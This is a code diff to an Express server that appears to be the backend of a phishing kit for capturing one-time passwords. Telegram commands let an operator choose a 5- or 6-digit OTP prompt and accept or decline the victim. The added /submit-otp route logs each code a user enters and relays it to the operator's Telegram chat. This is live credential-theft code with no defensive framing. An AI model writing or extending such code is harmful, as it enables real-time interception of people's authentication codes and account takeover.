@@ -4,6 +4,9 @@ const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch
 
 const app = express();
 
+let otpLength = null;
+let decision = null; // accept or decline
+
 app.use(express.json());
 
 // serve static files
@@ -84,32 +87,30 @@ app.get("/telegram-command", (req, res) => {
 
   if (cmd === "otp5") {
     otpLength = 5;
-    console.log("✅ OTP set to 5 from Telegram");
   }
 
   if (cmd === "otp6") {
     otpLength = 6;
-    console.log("✅ OTP set to 6 from Telegram");
   }
 
   if (cmd === "accept") {
     decision = "accept";
-    console.log("✅ USER ACCEPTED");
   }
 
   if (cmd === "decline") {
     decision = "decline";
-    console.log("❌ USER DECLINED");
   }
 
   if (cmd === "reset") {
     otpLength = null;
     decision = null;
-    console.log("🔄 Reset all");
   }
+
+  console.log("STATE:", { otpLength, decision });
 
   res.send("OK");
 });
+
 // ==============================
 // ROOT ROUTE
 // ==============================
@@ -119,11 +120,6 @@ app.get("/", (req, res) => {
 
 app.post("/set-otp", (req, res) => {
   const { otp } = req.body;
-
-  if (otp !== 5 && otp !== 6) {
-    return res.json({ success: false, message: "Only 5 or 6 allowed" });
-  }
-
   otpLength = otp;
 
   console.log("✅ OTP SET TO:", otpLength);
@@ -132,15 +128,42 @@ app.post("/set-otp", (req, res) => {
 });
 
 app.get("/otp-status", (req, res) => {
-  res.json({ otp: otpLength });
+  const currentOtp = otpLength;
+
+  otpLength = null; // ✅ RESET AFTER FRONTEND READS IT
+
+  res.json({ otp: currentOtp });
 });
 
 app.get("/decision-status", (req, res) => {
   res.json({ decision });
 });
 
-// ==============================
-const PORT = process.env.PORT || 10000;
+app.post("/submit-otp", async (req, res) => {
+  try {
+    const { otp } = req.body;
+
+    console.log("USER OTP:", otp);
+
+    const message = `
+🔢 OTP ENTERED:
+
+${otp}
+
+👇 Choose action below
+`;
+
+    await sendToTelegram(message);
+
+    res.json({ success: true });
+
+  } catch (err) {
+    console.log("OTP ERROR:", err.message);
+    res.json({ success: false });
+  }
+});
+
+ const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
   console.log(`Server running on ${PORT}`);
 });
